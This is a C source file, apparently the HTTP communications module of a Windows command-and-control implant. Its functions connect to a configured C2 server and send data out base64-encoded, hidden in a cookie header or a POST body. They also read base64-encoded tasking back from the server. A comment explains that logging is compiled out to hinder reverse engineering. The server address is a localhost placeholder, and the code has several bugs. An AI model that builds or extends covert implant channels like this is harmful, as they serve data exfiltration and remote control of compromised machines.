#ifndef C2_COMMS
#define C2_COMMS
#endif

#include <stdio.h>
#include <winhttp.h>
#include <wincrypt.h>
#pragma comment(lib, "Winhttp.lib")
#pragma comment(lib, "Crypt32.lib")


// Conditionally compile logging function only when debug flag is set.
// This will make the program harder to reverse engineer since it won't have
// error messages anywhere.
#ifdef DEBUG
void c2_log(const char* format, ...) {
    va_list args;
    int ret;

    va_start(args, format);
    vprintf(format, args);
    va_end(args);
}
#else
void c2_log(const char* format, ...) {
    return;
}
#endif

// Configurations
#define C2_IP L"127.0.0.1"
#define C2_PORT 80
#define C2_API_ENDPOINT L"/post"
#define C2_USER_AGENT L"TESTNG AGENT"

// Global handles for communication
HINTERNET hSession;
HINTERNET hConnect;
HINTERNET hRequest;

const char* ACCEPTED_FILETYPES[] = {"text/html", NULL}; // unused for now

// Gloabl heap handle
HANDLE HEAP;
#define Malloc(size) HeapAlloc(HEAP, HEAP_ZERO_MEMORY, (size))
#define Free(ptr) HeapFree(HEAP, 0, ptr);


// Sets up global HTTP connection handlers.
// Returns 0 on success and -1 on failure.
int SetupComms() {
    // Setup HTTP context
    HINTERNET hSession = WinHttpOpen(C2_USER_AGENT, WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
    if(! hSession) {
        c2_log("[!] SetupComms:WinHttpOpen failed with status %d\n", GetLastError());
        return -1;
    }
    
    // Get connection handle (doesnt actually make the connection)
    hConnect = WinHttpConnect(hSession, C2_IP, C2_PORT, 0);
    if (! hConnect) {
        c2_log("[!] SetupComms:WinHttpConnect failed with status %d\n", GetLastError());
        return -1;
    }

    // Disable automatic cookie handling
    DWORD option = WINHTTP_DISABLE_COOKIES;
    WinHttpSetOption(hConnect, WINHTTP_OPTION_DISABLE_FEATURE, &option, sizeof(option));

    // Set heap handle
    HEAP = GetProcessHeap();
    if (! HEAP) {
        c2_log("[!] SetupComms:GetProcessHeap failed with status %d\n", GetLastError());
        return -1;
    }

    return 0;
}


// Cleans up HTTP handles
void TearDownComms() {
    if (hRequest) {WinHttpCloseHandle(hRequest);}
    if (hConnect) {WinHttpCloseHandle(hConnect);}
    if (hSession) {WinHttpCloseHandle(hSession);}
}


// Resets a request handle to that it can be reused.
void c2_reset_handle() {
    // Close if it exists already
    if (hRequest)
        WinHttpCloseHandle(hRequest);

    hRequest = WinHttpOpenRequest(hConnect, L"POST", C2_API_ENDPOINT, NULL, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_REFRESH);
}


// Returns pointer to base64 encoding of bytes.
// Len is length of bytes.
// Result needs to be freed eventually.
char* base64(char* bytes, int len) {
    DWORD size = len;
    char* result;

    // First call fails and tells us how much memory to allocate
    CryptBinaryToString(bytes, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, NULL, &size);

    // Allocate memory
    result = Malloc(size * sizeof(wchar_t)); // just to be safe

    // Now call for real with proper size
    if (! CryptBinaryToString(bytes, len, CRYPT_STRING_BASE64 | CRYPT_STRING_NOCRLF, result, &size)) {
        Free(result);
        c2_log("[!] base64:CryptBinaryToString failed with status %s\n", GetLastError());
        return NULL;
    }

    return result;
}

// Returns pointer to base64 decoding of bytes.
// Len is size of buffer
// Result needs to be freed eventually.
char* unbase64(char* buffer, int len) {
    DWORD size = len;
    char* result;

    // First call fails and tells us how much memory to allocate
    CryptStringToBinary(buffer, len, CRYPT_STRING_BASE64, NULL, &size, NULL, NULL);

    // Allocate memory
    result = (char*) Malloc(size);

    // Now call for real with proper size
    if (! CryptStringToBinary(buffer, len, CRYPT_STRING_BASE64, result, &size, NULL, NULL)) {
        Free(result);
        c2_log("[!] base64:CryptStringToBinary failed with status %s\n", GetLastError());
        return NULL;
    }
    return result;
}


// Sends data to C2 server in body of  HTTP request.
// More suitable for large amounts of data than c2_send.
// Len is length of data.
int c2_send_body(char* data, int len) {
    BOOL result;

    c2_reset_handle();

    result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,       // headers
        0,          // header length
        data,       // data
        len,        // data length
        len,        // total length
        0           // optional context?
    );

    if (!result) {
        c2_log("[!] WinHttpSendRequest failed with code %d\n", GetLastError());
        return 0;
    }
    return len;
}


// Receives data via HTTP from C2 server.
// Len is length of buffer.
int c2_recv(char* buffer, int len) {
    BOOL result;
    DWORD numBytesRead;

    // Don't reset handle on response, otherwise we cant get the data

    // Get response
    result = WinHttpReceiveResponse(hRequest, NULL);
    if(!result) {
        c2_log("[!] WinHttpReceiveResponse failed with code %d\n", GetLastError());
        return 0;
    }

    // Read data in response
    result = WinHttpReadData(hRequest, buffer, len, &numBytesRead);
    if(!result) {
        c2_log("[!] WinHttpReadData failed with code %d\n", GetLastError());
        return 0;
    }

    // Base64 decode data (performed in place)
    char* decoded = unbase64(buffer, numBytesRead);
    strncpy(buffer, decoded, numBytesRead);
    buffer[numBytesRead - 1] = '\0';
    Free(decoded);

    return numBytesRead;
}


// Sends data to C2 server as base64 encoded cookie in HTTP request.
// More suitable for small amounts of data than c2_send_body.
// Len is length of data.
int c2_send(char* data, int len) {
    BOOL result;
    wchar_t* data_wide; // data in wide char format
    wchar_t* cookie;

    c2_reset_handle();

    // c2_log("SEND DATA: %s\n", data);
    // c2_log("SEND LEN : %d\n", len);

    // Base64 encode data
    char* b64_data = base64(data, len);
    int b64_len = strlen(b64_data);         // IMPORTANT: make sure to use b64_len and not len below!

    // c2_log("B64 DATA: %s\n", b64_data);
    // c2_log("B64 LEN : %d\n", strlen(b64_data));

    // Convert bas64 data to wide char string
    data_wide = (wchar_t*) Malloc(b64_len* sizeof(wchar_t));
    MultiByteToWideChar(CP_UTF8, 0, b64_data, -1, data_wide, b64_len);

    // wprintf(L"WIDE DATA: %s\n", data_wide);
    // wprintf(L"WIDE LEN : %zd\n", wcslen(data_wide));

    // Allocate memory for cookie
    cookie = (wchar_t*) Malloc((b64_len + 14) * sizeof(wchar_t)); // +14 to make room for "Cookie: data=" + null byte
    
    // Set cookie value
    swprintf(cookie, b64_len+14, L"Cookie: data=%s", data_wide);
    WinHttpAddRequestHeaders(hRequest, cookie, (ULONG)-1L, WINHTTP_ADDREQ_FLAG_ADD );

    result = WinHttpSendRequest(
        hRequest,
        WINHTTP_NO_ADDITIONAL_HEADERS,   // headers
        0,                               // header length
        WINHTTP_NO_REQUEST_DATA,         // data
        0,                               // data length
        0,                               // total length
        0                                // optional context?
    );

    Free(b64_data);
    Free(data_wide);
    Free(cookie);

    if (!result) {
        c2_log("[!] cookie:WinHttpSendRequest failed with code %d\n", GetLastError());
        return 0;
    }

    return len;
}